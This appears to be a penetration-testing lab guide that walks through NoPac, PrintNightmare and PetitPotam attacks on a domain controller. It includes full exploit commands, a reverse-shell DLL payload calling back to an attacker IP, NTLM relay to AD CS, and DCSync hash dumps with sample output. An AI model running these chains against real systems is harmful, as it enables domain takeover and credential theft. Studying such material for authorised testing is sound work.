@@ -1,0 +1,767 @@
+> **Purpose:** run the three late-2021 attacks — NoPac, PrintNightmare and PetitPotam — as complete workflows: what to set up, which terminal owns which process, what the output must say before you continue, and which alternative branch to take. Commands are preserved from the source; only target values are parameterized.
+
+## 1. Scope, risk and conventions
+
+- **Lab only.** These are dual-use exploitation procedures. Run them only in an authorised lab or engagement, with written approval. PrintNightmare can crash the print spooler and cause a service outage.
+- **Artefacts.** Every path here leaves something behind: a renamed machine account, a `.ccache` file, an SMB service, an imported ticket. Record what you created so it can be removed and reported.
+- **Metasploit budget.** The PrintNightmare handler is a Metasploit module. Under the OSCP rules the Metasploit allowance is one machine across the exam — spend it deliberately.
+- **Tool naming.** The source uses the legacy Impacket script names (`scanner.py`, `rpcdump.py`, `secretsdump.py`, `smbserver.py`, `ntlmrelayx.py`). Kali also ships them prefixed as `impacket-secretsdump`, `impacket-rpcdump` and so on; the arguments are the same. The source spelling is kept below.
+- **Status.** Nothing on this page was executed against a domain. Flags for `impacket-secretsdump` and `impacket-rpcdump` were checked against the installed binaries; the rest is documented from the source, so every step is **Documented**.
+
+<table header-row="true">
+<tr><td>Attack</td><td>CVEs</td><td>Auth needed</td><td>Key precondition</td><td>End state</td></tr>
+<tr><td>NoPac / SamAccountName spoofing</td><td>CVE-2021-42278, CVE-2021-42287</td><td>Standard domain user</td><td><code>ms-DS-MachineAccountQuota</code> above 0</td><td>SYSTEM shell on the DC, or a ccache for DCSync</td></tr>
+<tr><td>PrintNightmare</td><td>CVE-2021-34527, CVE-2021-1675</td><td>Standard domain user</td><td>Spooler running, MS-RPRN/MS-PAR exposed</td><td>SYSTEM via a DLL loaded from your SMB share</td></tr>
+<tr><td>PetitPotam / MS-EFSRPC</td><td>CVE-2021-36942</td><td>None</td><td>AD CS web enrollment reachable, NTLM not blocked</td><td>DC machine certificate → TGT → DCSync</td></tr>
+</table>
+
+## 2. NoPac — SamAccountName spoofing
+
+Two CVEs combine into one command. CVE-2021-42278 is a SAM bypass that lets a computer account's sAMAccountName be changed; CVE-2021-42287 is a flaw in the Kerberos PAC in AD DS, so the KDC issues a TGS for the closest matching name — which is now the DC's. Authenticated users may add up to ten computers by default, which is the whole foothold.
+
+### Step 01 — Install Impacket and clone the exploit
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+git clone https://github.com/SecureAuthCorp/impacket.git
+python setup.py install
+```
+
+```bash
+git clone https://github.com/Ridter/noPac.git
+```
+
+**Purpose:** noPac drives Impacket to talk to the DC, upload a payload and run commands, so Impacket must be importable before anything else. The tool is already at `/opt/noPac` on the source's ATTACK01 host.
+
+**Prerequisites:** Python 3 and git on the attack host; outbound access to GitHub if the tools are not preinstalled.
+
+**Look for:** the clone completing and `setup.py install` finishing without a traceback.
+
+**Failure path:** `python setup.py install` run from outside the `impacket` directory fails with “no such file”. The source shows the command without a `cd`; run it from inside the cloned repository.
+
+**Next:** Step 02.
+
+### Step 02 — Scan the DC for the vulnerability
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+sudo python3 scanner.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> -use-ldap
+```
+
+**Purpose:** confirm the DC will issue a TGT under a spoofed machine name before attempting the exploit. A standard domain user is enough.
+
+**Prerequisites:** a valid low-privilege domain credential; network route to the DC on 389/636.
+
+**Look for:** the machine-account quota, then two TGTs — one with a PAC from the DC IP and one from the DC's FQDN.
+
+```output
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
+[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
+```
+
+**Success path:** both TGT lines present → the DC is vulnerable; continue to Step 03.
+
+**Failure path:** `ms-DS-MachineAccountQuota = 0` → your user cannot add a machine account, and this attack cannot run. The source notes that setting it to 0 blocks this and several other AD attacks. No TGT issued → the host is patched; stop this branch.
+
+**Common mistake:** ignoring the quota line because the rest of the scan looked healthy. The quota is the gate.
+
+**Next:** Step 03.
+
+### Step 03 — Get a SYSTEM shell
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
+```
+
+**Purpose:** add a computer account, rename it to the DC's sAMAccountName, request tickets, impersonate the built-in Administrator and drop into a semi-interactive shell.
+
+**Prerequisites:** Step 02 confirmed the quota and a spoofed TGT. `noPac.py` is a GitHub PoC (`cube0x0/noPac`), not a Kali package — clone that repository and run the script from its directory; it is **not** present on the build host used for this audit.
+
+**Look for:** the machine account being added, its sAMAccountName matching the DC, the tickets saved, and the semi-interactive shell prompt.
+
+```output
+[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
+[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
+[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
+[*] Saving ticket in ACADEMY-EA-DC01.ccache
+[*] Resting the machine account to WIN-LWJFQMAXRVN$
+[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*] Saving ticket in administrator.ccache
+[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
+[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+**Success path:** `Launching semi-interactive shell` and a `C:\Windows\system32>` prompt → you have SYSTEM-level command execution on the DC. Find the tickets (Step 04) or DCSync directly (Step 05).
+
+**Failure path:** the shell opens but every command fails → an AV/EDR product is blocking the service-based execution. See “Windows Defender and the smbexec footprint” below. The failed delete of the machine account is expected on the lab DC and does not invalidate the cached ticket — the sAMAccountName was already restored.
+
+**Common mistake:** typing `cd`. This is an `smbexec` shell: it has no directory context, so use absolute paths for every command.
+
+**Next:** Step 04.
+
+### Step 04 — Find the tickets it wrote
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+ls
+```
+
+**Purpose:** locate the ccache files written into the directory where the exploit ran. They are reusable credential material for pass-the-ticket.
+
+**Look for:** one cache per identity, alongside the exploit files.
+
+```output
+administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
+README.md  scanner.py
+```
+
+**Success path:** an `administrator_*.ccache` → use it for pass-the-ticket, or continue to Step 05.
+
+**Evidence:** the file names and their timestamps; note where they are so they can be deleted.
+
+**Next:** Step 05, or the pass-the-hash step on the Active Directory page.
+
+### Step 05 — DCSync the built-in Administrator
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN_PART1>/administrator
+```
+
+**Purpose:** skip the shell and go straight to the hash — noPac reuses the cached Administrator ticket and calls `secretsdump` over DRSUAPI.
+
+**Prerequisites:** Steps 02–03 completed at least once; the Administrator ticket is already in cache. Run `noPac.py` from the cloned PoC directory described in Step 03.
+
+**Look for:** the DRSUAPI line and the `administrator:500:` hash entry.
+
+```output
+[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Exploiting..
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+[*] Cleaning up...
+```
+
+**Success path:** the `administrator:500:` line includes the NT hash → pass-the-hash or use it for further DCSync. The `-dump` path still writes a ccache to disk, so clean it up.
+
+**Common mistake:** assuming “Cleaning up” removed the ccache. It did not — Step 04 still applies.
+
+**Next:** authenticate with the hash (Active Directory page, pass-the-hash) and prove access on each machine.
+
+### Windows Defender and the smbexec footprint
+
+The first thing `smbexec` does is create a service called **BTOBTO**. A second service, **BTOBO**, is created and each command you type is written into `execute.bat`, echoed to a temporary file, executed, then deleted. That write-execute-delete cycle per command is what gets flagged.
+
+> **Source screenshot, transcribed:** Windows Security alert — `VirTool:Win32/MSPSEexecCommand`, alert level Severe, status Removed, dated 3/25/2022.
+
+If opsec matters, avoid `smbexec`-based execution. On an exam it is acceptable; on a real assessment it is a signature you cannot un-ring.
+
+## 3. PrintNightmare — spooler RCE
+
+Two vulnerabilities in the Print Spooler service present on every Windows host: CVE-2021-34527 and CVE-2021-1675. Local privilege escalation is covered on the Windows Privilege Escalation page; here it is remote code execution against a Windows Server 2019 Domain Controller. This workflow needs **three terminals**: one serves the payload, one catches the callback, one runs the exploit.
+
+### Step 06 — Install cube0x0's exploit and Impacket fork
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+```
+
+```bash
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+```
+
+**Purpose:** the exploit relies on cube0x0's Impacket fork. Stock Impacket will not do — this is the most common reason the exploit fails. The fork is already installed on the source's ATTACK01 host.
+
+**Look for:** the uninstall completing and the fork installing cleanly.
+
+**Failure path:** leaving stock Impacket in place produces an RPC error at exploit time, not at install time. If Step 11 fails while binding, re-check this step first.
+
+**Next:** Step 07.
+
+### Step 07 — Terminal 3: confirm the spooler interfaces
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+rpcdump.py @<DOMAIN_CONTROLLER_IP> | egrep 'MS-RPRN|MS-PAR'
+```
+
+**Prerequisites:** `rpcdump.py` is Impacket's endpoint mapper. Kali/Debian ship it as `impacket-rpcdump` (package `impacket`) — if the legacy name is `command not found`, run `impacket-rpcdump @<DOMAIN_CONTROLLER_IP>` with the same arguments. Source checkouts and upstream `pip install impacket` provide the `.py` name.
+
+**Purpose:** prove the Print System Asynchronous Remote Protocol and Print System Remote Protocol are exposed before building a payload.
+
+**Look for:** the two protocol lines.
+
+```output
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+Protocol: [MS-RPRN]: Print System Remote Protocol
+```
+
+**Success path:** both lines → continue to Step 08.
+
+**Failure path:** neither line → the spooler interface is not exposed (patched, disabled, or firewalled); stop this branch. Do not continue to the payload steps.
+
+**Next:** Step 08.
+
+### Step 08 — Terminal 1: build the DLL payload
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f dll > backupscript.dll
+```
+
+**Purpose:** produce the DLL the target will load from your SMB share.
+
+```output
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 8704 bytes
+```
+
+**Look for:** the final size line and a non-empty `backupscript.dll`.
+
+**Next:** Step 09.
+
+### Step 09 — Terminal 1: serve the DLL over SMB (keep this terminal open)
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+```
+
+**Purpose:** host the payload at a UNC path the target can reach. This process must stay running until the exploit has pulled the DLL.
+
+**Prerequisites:** `backupscript.dll` exists at the path you pass; port 445 free on the attack host. Kali ships Impacket's SMB server as `impacket-smbserver` (package `impacket`); if `smbserver.py` is `command not found`, use `impacket-smbserver` with the same arguments.
+
+**Look for:** the share starting and the callbacks registered.
+
+```output
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+```
+
+**Success path:** the server is listening → leave Terminal 1 open and move to Step 10 in a second terminal.
+
+**Failure path:** port 445 already in use → stop the conflicting service (for example a previous `smbserver`) before retrying.
+
+**Next:** Step 10 (different terminal).
+
+### Step 10 — Terminal 2: start the handler (keep this terminal open)
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <ATTACKER_IP>
+set LPORT 8080
+run
+```
+
+**Purpose:** catch the reverse shell the DLL will open. The port must match Step 08 (`8080`).
+
+```output
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
+LHOST => 10.3.88.114
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+[*] Started reverse TCP handler on 172.16.5.225:8080
+```
+
+**Success path:** `Started reverse TCP handler` → leave Terminal 2 open.
+
+**Common mistake:** the source's echoed `LHOST => 10.3.88.114` does not match the `set` value — a copy/paste artefact in the original output. Confirm the handler is bound to your own attack IP before firing the exploit.
+
+**Next:** Step 11 (Terminal 3).
+
+### Step 11 — Terminal 3: fire the exploit at the UNC path
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+sudo python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DOMAIN_CONTROLLER_IP> '\\<ATTACKER_IP>\CompData\backupscript.dll'
+```
+
+**Purpose:** call the spooler with a driver path pointing at your share, so the DC loads and executes the DLL.
+
+**Prerequisites:** Step 07 confirmed MS-RPRN/MS-PAR; Step 09's share is still running; Step 10's handler is listening on the same port.
+
+**Look for:** the RPC bind, the discovered driver path, then the UNC execution attempt.
+
+```output
+[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
+[+] Bind OK
+[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
+[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
+[*] Try 1...
+[*] Stage0: 0
+[*] Try 2...
+[*] Stage0: 0
+[*] Try 3...
+
+<SNIP>
+```
+
+**Success path:** `Bind OK`, `pDriverPath Found`, and the UNC execute line → watch Terminal 2 for the session. The repeated `Try` / `Stage0: 0` lines are trimmed here; the source shows three iterations before the callback.
+
+**Failure path:** bind failure → wrong Impacket (Step 06). No `pDriverPath` → the spooler is not exposing the expected driver. Target cannot reach your share → check routing and that `smbserver` bound to the right interface.
+
+**Evidence:** the exploit output plus the moment the session opens.
+
+**Next:** Step 12.
+
+### Step 12 — Terminal 2: catch the session and confirm SYSTEM
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+shell
+whoami
+```
+
+**Purpose:** drop from Meterpreter into a shell on the DC and confirm the privilege level.
+
+```output
+[*] Sending stage (200262 bytes) to 172.16.5.5
+[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 5912 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.737]
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+**Success path:** `nt authority\system` on the DC → a standard domain user became SYSTEM. Prove the machine and start documenting.
+
+> **Risk:** this exploit can crash the print spooler on the target and disrupt a service. If that service matters to the client, you have caused an outage. Get written approval before running it.
+
+**Cleanup:** stop Terminal 1 (`smbserver`) and Terminal 2 (the handler) with `Ctrl-C` once the session is no longer needed. Neither the source nor this page ran that teardown; it is standard operator hygiene, not a documented command.
+
+## 4. PetitPotam — coercion to AD CS
+
+CVE-2021-36942, patched August 2021. An unauthenticated attacker coerces a Domain Controller to authenticate over NTLM on port 445, abusing MS-EFSRPC through the Local Security Authority Remote Protocol (LSARPC). Where AD CS exists, the coercion becomes a chain: the DC's authentication is relayed to the CA's Web Enrollment page, which signs a certificate for the DC machine account; that certificate requests a TGT, and DCs hold replication rights.
+
+<table header-row="true">
+<tr><td>Step</td><td>Tool</td><td>Result</td></tr>
+<tr><td>1. Coerce the DC</td><td>PetitPotam</td><td>NTLM authentication to your host</td></tr>
+<tr><td>2. Relay to the CA</td><td>ntlmrelayx</td><td>base64 certificate for the DC machine account</td></tr>
+<tr><td>3. Certificate to TGT</td><td>gettgtpkinit (Linux) or Rubeus (Windows)</td><td>a <code>.ccache</code> or a kirbi in memory</td></tr>
+<tr><td>4. TGT to hashes</td><td>secretsdump or Mimikatz dcsync</td><td>Administrator and <code>krbtgt</code> NT hashes</td></tr>
+</table>
+
+### Step 13 — Terminal 1: start the relay at the CA (keep this terminal open)
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp --adcs --template DomainController
+```
+
+**Purpose:** listen for the DC's NTLM authentication and relay it to the CA's Web Enrollment endpoint, requesting a certificate from the DomainController template.
+
+**Prerequisites:** the CA host and its `/certsrv` URL are known; port 445 free on the attack host for the relay's SMB server. If the CA is unknown, `certipy find` can locate it. Kali ships the relay as `impacket-ntlmrelayx` (package `impacket`) — use that name if `ntlmrelayx.py` is `command not found`; the arguments are the same.
+
+**Look for:** both servers starting and `Running in relay mode to single host`.
+
+```output
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client SMB loaded..
+[+] Protocol Attack HTTP loaded..
+[+] Protocol Attack SMB loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Servers started, waiting for connections
+```
+
+**Success path:** `Servers started, waiting for connections` → leave Terminal 1 open and coerce in Step 14.
+
+**Failure path:** port 445 in use → stop the conflicting SMB server. Wrong CA path → the relay connects but the certificate request fails at the HTTP stage.
+
+**Next:** Step 14 (different terminal).
+
+### Step 14 — Terminal 2: coerce the DC to authenticate
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+python3 PetitPotam.py <ATTACKER_IP> <DOMAIN_CONTROLLER_IP>
+```
+
+**Purpose:** trigger the EFSRPC call that makes the DC authenticate to your relay. No credentials needed.
+
+**Prerequisites:** Step 13's relay is listening. `PetitPotam.py` is an Impacket example script, not a package binary, and is **not** installed on the build host used for this audit — fetch it from the Impacket repository (`examples/PetitPotam.py`) or use `impacket-PetitPotam` where your package ships it.
+
+**Look for:** a successful bind, then the expected error after `EfsRpcOpenFileRaw`.
+
+```output
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+```
+
+**Success path:** `ERROR_BAD_NETPATH` followed by `Attack worked!` → the DC authenticated to the relay. Return to Terminal 1 for the certificate.
+
+**Failure path:** no bind → LSARPC blocked or the host is patched. Bind but no `ERROR_BAD_NETPATH` → the coercion did not fire; confirm the relay was listening first.
+
+**Next:** read Terminal 1.
+
+### Relay result — certificate issued
+
+The certificate is printed by the relay in Terminal 1, not by PetitPotam. The source output, with the ~9 KB base64 body trimmed:
+
+```output
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE!
+[*] Base64 certificate of user ACADEMY-EA-DC01$:
+MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6z/QuWp2pWrXS9zwt7bc1SQpMcCjfiFalKIlpPQQiti7xvTMokV+X6YlhUokM9yz3jTAU0ylvw82LoKsKMCKVx0mnhVDUlxR+i1Irn4piInOVfY0c2IAGDdJViVdXgQ7njtkg0R+Ab0CWrqLCtG6nVPIJbxFE5O84s+P3xMBgYoN4cj
+
+<SNIP>
+
+[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
+```
+
+**Look for:** `GOT CERTIFICATE!` and the `Base64 certificate of user ...` line. Copy the entire base64 body into `<BASE64_BLOB>` for Step 16.
+
+**Failure path:** `Authenticating ... SUCCEED` never appears → the relay did not receive usable credentials. A second coercion returns `Skipping user ... attack was already performed`; that is the relay refusing a duplicate, not a new failure.
+
+### Step 15 — Alternative: other coercion triggers
+
+**Priority:** Conditional · **Run on:** Either · **Status:** Documented
+
+```powershell
+.\PetitPotam.exe <ATTACKER_IP> <DOMAIN_CONTROLLER_IP>
+```
+
+```powershell
+misc::efs /server:<DOMAIN_CONTROLLER_IP> /connect:<ATTACKER_IP>
+```
+
+```powershell
+Invoke-PetitPotam.ps1 -Target <DOMAIN_CONTROLLER_IP> -CaptureServer <ATTACKER_IP>
+```
+
+**Purpose:** trigger the same MS-EFSRPC coercion from a Windows host when Python is not an option. The first is the compiled executable, the second is Mimikatz's EFS module (run from a `mimikatz` prompt), the third is the PowerShell implementation.
+
+**Prerequisites:** Step 13's relay must already be listening — all three triggers produce the same authentication, so the relay target does not change.
+
+**Success path:** the relay in Terminal 1 logs `Authenticating ... SUCCEED` and prints the certificate, exactly as in the relay result above.
+
+**Common mistake:** running a trigger before the relay is up. The DC authenticates to nothing, and the coercion looks like it failed.
+
+**Next:** the relay result, then Step 16.
+
+### Step 16 — Request the DC's TGT from the certificate
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <BASE64_BLOB> dc01.ccache
+```
+
+**Purpose:** use PKINIT with the issued certificate to obtain a TGT for the DC machine account.
+
+**Prerequisites:** the full base64 certificate from the relay output; PKINITtools present at `/opt/PKINITtools`.
+
+**Look for:** the AS-REP encryption key and `Saved TGT to file`.
+
+```output
+2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
+2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
+2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
+2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
+```
+
+**Success path:** `Saved TGT to file` → keep the **AS-REP encryption key**; Step 20 needs it to decrypt the U2U ticket.
+
+**Common mistake:** losing the AS-REP key. It is not in the ccache and cannot be recovered later.
+
+**Next:** Step 17.
+
+### Step 17 — Load the TGT and confirm it
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+export KRB5CCNAME=dc01.ccache
+```
+
+```bash
+klist
+```
+
+**Purpose:** point Kerberos tooling at the new cache, then prove it holds a `krbtgt` ticket.
+
+**Look for:** the cache path and a `krbtgt/` service principal.
+
+```output
+Ticket cache: FILE:dc01.ccache
+Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+
+**Success path:** a `krbtgt` line → the TGT is usable for Step 18.
+
+**Common mistake:** setting `KRB5CCNAME` in one terminal and running the next command in another. The export is per shell.
+
+**Next:** Step 18.
+
+### Step 18 — DCSync with the DC's ticket
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+secretsdump.py -just-dc-user <DOMAIN_PART1>/administrator -k -no-pass "<DC_HOSTNAME>$"@<DC_HOSTNAME>.<DOMAIN>
+```
+
+**Purpose:** use the DC's own TGT to replicate the Administrator hash over DRSUAPI.
+
+**Prerequisites:** Step 17 exported `KRB5CCNAME`; clock within Kerberos skew of the DC. Kali ships the tool as `impacket-secretsdump` (package `impacket`) — the legacy `secretsdump.py` name only exists in a source checkout; use `impacket-secretsdump` with the same arguments.
+
+**Look for:** the DRSUAPI line and the `administrator:500:` entry.
+
+```output
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+[*] Cleaning up...
+```
+
+**Success path:** the hash appears → Step 19 proves it, or Step 20 recovers the machine account's own NT hash.
+
+**Failure path:** `KRB_AP_ERR_SKEW` → sync the clock before blaming the ticket.
+
+The source also shows the shorter form, which reads the username from the ccache:
+
+```bash
+secretsdump.py -just-dc-user <DOMAIN_PART1>/administrator -k -no-pass <DC_HOSTNAME>.<DOMAIN>
+```
+
+**Next:** Step 19.
+
+### Step 19 — Prove admin access with the recovered hash
+
+**Priority:** Core · **Run on:** Kali · **Status:** Documented
+
+```bash
+nxc smb <DOMAIN_CONTROLLER_IP> -u administrator -H <NTHASH>
+# legacy spelling, same arguments — CrackMapExec is deprecated
+crackmapexec smb <DOMAIN_CONTROLLER_IP> -u administrator -H <NTHASH>
+```
+
+**Purpose:** confirm the recovered hash grants administrative access to the DC.
+
+**Prerequisites:** `nxc` (NetExec, `pipx install netexec`) is the maintained successor to CrackMapExec and takes the same arguments; both binaries are present here, and `nxc` is the one the rest of this site uses.
+
+**Look for:** `(Pwn3d!)` on the success line.
+
+```output
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+**Success path:** `(Pwn3d!)` → you have administrative execution rights on the DC. Capture proof and document.
+
+**Next:** proof on each machine, then the report.
+
+### Step 20 — Alternative: recover the DC's NT hash over U2U
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+python /opt/PKINITtools/getnthash.py -key <ASREP_KEY> <DOMAIN>/<DC_HOSTNAME>$
+```
+
+**Purpose:** instead of DCSync, submit a TGS request to yourself with the PAC containing the target's NT hash, and decrypt it with the AS-REP key from Step 16.
+
+**Prerequisites:** the TGT from Step 16 is still in cache and the AS-REP key is recorded.
+
+**Look for:** `Recovered NT Hash` and a 32-hex value.
+
+```output
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+313b6f423cd1ee07e91315b4919fb4ba
+```
+
+**Success path:** the hash is the DC machine account's NT hash → usable in Step 21 or for pass-the-hash.
+
+**Failure path:** `Using TGT from cache` never appears → `KRB5CCNAME` is not set in this shell (Step 17). A decryption error → wrong AS-REP key.
+
+**Next:** Step 21.
+
+### Step 21 — Alternative: DCSync with the recovered NT hash
+
+**Priority:** Advanced · **Run on:** Kali · **Status:** Documented
+
+```bash
+secretsdump.py -just-dc-user <DOMAIN_PART1>/administrator "<DC_HOSTNAME>$"@<DOMAIN_CONTROLLER_IP> -hashes aad3c435b514a4eeaad3b935b51304fe:<NTHASH>
+```
+
+**Purpose:** authenticate as the machine account with its NT hash and replicate the Administrator hash.
+
+**Prerequisites:** the NT hash from Step 20; the LM half of `-hashes` is the placeholder the source prints. As in Step 18, `impacket-secretsdump` is the executable name on Kali/Debian.
+
+**Look for:** the same `administrator:500:` entry as Step 18.
+
+**Success path:** identical result to Step 18 — this is a branch, not an additional requirement. Run one or the other, then Step 19.
+
+**Common mistake:** copying the source's LM prefix verbatim with a different NT hash. Pair the LM placeholder with the NT hash you actually recovered.
+
+**Next:** Step 19.
+
+### Step 22 — Alternative: Windows path — request and import the TGT with Rubeus
+
+**Priority:** Advanced · **Run on:** Windows · **Status:** Documented
+
+```powershell
+.\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<BASE64_BLOB> /ptt
+```
+
+**Purpose:** on a Windows attack host, do Steps 16–17 in one command: PKINIT for the TGT and import it into the current logon session.
+
+**Prerequisites:** a Windows host with Rubeus and the base64 certificate copied over. The source uses the MS01 attack host.
+
+**Look for:** `TGT request successful!`, the ticket summary, and `Ticket successfully imported!`.
+
+```output
+[*] Action: Ask TGT
+[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[+] TGT request successful!
+[*] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
+  UserName                 :  ACADEMY-EA-DC01$
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+```
+
+**Success path:** `Ticket successfully imported!` → the ticket is in memory; confirm with Step 23's `klist`.
+
